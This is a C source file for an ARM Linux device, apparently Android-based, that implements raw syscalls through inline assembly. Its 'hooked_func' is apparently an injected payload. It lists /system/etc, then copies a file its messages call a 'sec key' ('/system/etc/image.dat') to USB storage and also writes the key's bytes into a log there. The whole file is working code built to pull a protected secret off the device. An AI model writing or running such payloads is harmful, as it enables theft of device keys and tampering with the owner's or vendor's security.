#define O_RDONLY 0x0000
#define O_WRONLY 0x0001
#define O_CREAT  0x0040
#define EOF -1
#define R_OK 4
#define MAX_FILENAME 256
#define BUFF_SIZE 4098

typedef unsigned int mode_t;
typedef int off_t;

typedef struct dirent {
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
} dirent;

static int write(int fd, const char* buf, unsigned int len) {
    register int ret asm("r0");
    register int _fd asm("r0") = fd;
    register const char* _buf asm("r1") = buf;
    register unsigned int _len asm("r2") = len;
    register int sys_write asm("r7") = 4;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_fd), "r"(_buf), "r"(_len), "r"(sys_write)
                 :);
    return ret;
}

static int exit(int code) {
    register int ret asm("r0");
    register int _code asm("r0") = code;
    register int sys_exit asm("r7") = 1;
    asm volatile("svc #0" : "=r"(ret) : "r"(_code), "r"(sys_exit) :);
    return ret;
}

static int read(int fd, const char* buf, unsigned int len) {
    register int ret asm("r0");
    register int _fd asm("r0") = fd;
    register const char* _buf asm("r1") = buf;
    register unsigned int _len asm("r2") = len;
    register int sys_read asm("r7") = 3;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_fd), "r"(_buf), "r"(_len), "r"(sys_read)
                 :);
    return ret;
}

static int open(const char* path, int flags, mode_t mode) {
    register int ret asm("r0");
    register const char* _path asm("r0") = path;
    register int _flags asm("r1") = flags;
    register mode_t _mode asm("r2") = mode;
    register int sys_open asm("r7") = 5;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_path), "r"(_flags), "r"(_mode), "r"(sys_open)
                 :);
    return ret;
}

static int close(int fd) {
    register int ret asm("r0");
    register int _fd asm("r0") = fd;
    register int sys_read asm("r7") = 6;
    asm volatile("svc #0" : "=r"(ret) : "r"(_fd), "r"(sys_read) :);
    return ret;
}

static int getdents(unsigned int fd, struct dirent* dirp, unsigned int count) {
    register int ret asm("r0");
    register unsigned int _fd asm("r0") = fd;
    register struct dirent* _dirp asm("r1") = dirp;
    register unsigned int _count asm("r2") = count;
    register int sys_getdents asm("r7") = 141; // getdents syscall number
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_fd), "r"(_dirp), "r"(_count), "r"(sys_getdents)
                 :);
    return ret;
}

static int access(const char* path, int mode) {
    register int ret asm("r0");
    register const char* _path asm("r0") = path;
    register int _mode asm("r1") = mode;
    register int sys_access asm("r7") = 33;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_path), "r"(_mode), "r"(sys_access)
                 :);
    return ret;
}

static int fgetc(int fd) {
	char c;
	if (read(fd, &c, 1) == 1) {
		return c;
	} else {
		return EOF;
	}
}

static int fputc(char c, int fd) {
	write(fd, &c, 1);
}

void hooked_func() {
    int src_fp, dst_fp, len, err, nread, sanity_fp, log_fp;
	struct dirent *d;
    char buffer[BUFF_SIZE];
	char d_buffer[BUFF_SIZE];

	// Paths
	//@textify
	char src_path[] = "/system/etc/image.dat";
	//@textify
	char dst_path[] = "/storage/usb0/image.dat";
	//@textify
	char etc_path[] = "/system/etc";
	//@textify
	char log_filename[] = "/storage/usb0/XXlog.txt";
	//@textify
	char sanity_filename[] = "/storage/usb0/sanity.txt";

	// Error messages
	//@textify
	char error_source[] = "E: source sec key open\n";
	//@textify
	char error_dest[] = "E: dest sec key open\n";
	//@textify
	char error_read[] = "E: reading sec key file\n";
	//@textify
	char error_write[] = "E: writing sec key file\n";
	//@textify
	char error_dir_read[] = "E: reading dir\n";
	//@textify
	char error_dir_open[] = "E: open dir\n";
	

	// Other
	//@textify
	char copy_success[] = "Copy sec key success\n";
	//@textify
	char sanity_value[] = "Hello!\n";
	//@textify
	char str_d_name[] = "d_name: ";
	//@textify
	char is_readable[] = " is readable\n";
	//@textify
	char is_not_readable[] = " is not readable\n";
	//@textify
	char str_start_copy[] = "Start copy========\n";
	//@textify
	char str_end_copy[] = "\nEnd copy==========\n";
	//@textify
	char str_end[] = "End ========= \n";
	//@textify
	char space[] = "  ";

	// check if we can write anything to a file on the USB
	sanity_fp = open(sanity_filename, O_WRONLY | O_CREAT, 0777);
	if (sanity_fp > 0) {
		write(sanity_fp, sanity_value, sizeof(sanity_value) - 1);
	}
	close(sanity_fp);

	log_fp = open(log_filename, O_WRONLY | O_CREAT, 0777);
	write(log_fp, sanity_value, sizeof(sanity_value) - 1);


	// print directory permissions
	int dir_fd = open(etc_path, O_RDONLY, 0);
	if (dir_fd < 0) {
        write(log_fp, error_dir_open, sizeof(error_dir_open) - 1);
		return;
	}

	while (1) {
		nread = getdents(dir_fd, (struct dirent *)d_buffer, BUFF_SIZE);
		if (nread < 0) {
			write(log_fp, error_dir_read, sizeof(error_dir_read) - 1);
			return;
		}
		if (nread == 0) { // end of directory
			break;
		}

		for (int bpos = 0; bpos < nread;) {
       		d = (struct dirent *) (d_buffer + bpos);

			int name_len = 0;
			while(name_len < MAX_FILENAME && d->d_name[name_len]) {
            	name_len++;
			}

            write(log_fp, str_d_name, sizeof(str_d_name) - 1);
			write(log_fp, d->d_name, name_len);
			if (access(d->d_name, R_OK) == 0) {
				write(log_fp, is_readable, sizeof(is_readable) - 1);
			} else {
				write(log_fp, is_not_readable, sizeof(is_not_readable) - 1);
			}

			bpos += d->d_reclen;
		}
	}

	close(dir_fd);

    src_fp = open(src_path, O_RDONLY, 0);
    dst_fp = open(dst_path, O_WRONLY | O_CREAT, 0777);

    if (src_fp < 0) {
        write(log_fp, error_source, sizeof(error_source) - 1);
        goto END;
	}

    if (dst_fp < 0) {
        write(log_fp, error_dest, sizeof(error_dest) - 1);
        goto END;
    }

	int c, i = 0;
	write(log_fp, str_start_copy, sizeof(str_start_copy) - 1);
	while((c = fgetc(src_fp+i)) != EOF) {
    	fputc(c, dst_fp+i);
		write(log_fp, space, sizeof(space) - 1);
		write(log_fp, (char *)&c, 1);
	}
	write(log_fp, str_end_copy, sizeof(str_end_copy) - 1);

    write(log_fp, copy_success, sizeof(copy_success) - 1);

END:
	write(log_fp, str_end, sizeof(str_end) - 1);
	close(log_fp);
    close(src_fp);
    close(dst_fp);
    return;
}
